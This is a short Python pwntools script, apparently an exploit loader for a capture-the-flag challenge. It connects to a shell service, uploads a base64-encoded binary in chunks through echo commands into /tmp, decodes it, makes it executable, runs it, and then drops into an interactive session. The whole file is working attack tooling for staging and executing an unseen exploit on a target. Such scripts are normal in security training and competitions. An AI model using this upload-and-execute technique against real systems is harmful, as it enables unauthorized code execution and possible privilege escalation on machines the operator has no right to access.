from pwn import *
import time
import base64
import os
#context.log_level = 'debug'

def run(cmd):
    p.sendlineafter("$ ", cmd)
    p.recvline()

with open("b64", "r") as f:
    payload = f.read()

p = remote("127.0.0.1", 9999) # remote
#print(p.recv())
#elf = ELF("../deploy/src/run.sh")

#sock = (process["../deploy/src/run.sh"])

run('cd /tmp')

info("Uploading...")
for i in range(0, len(payload), 512):
    print(f"Uploading... {i:x} / {len(payload):x}")
    #print(payload[i:i+512])
    run('echo "{}" >> b64exp'.format(payload[i:i+512]))
run('base64 -d b64exp > exploit')
#run('rm b64exp')
run('chmod +x exploit')

run('/tmp/exploit')
p.interactive()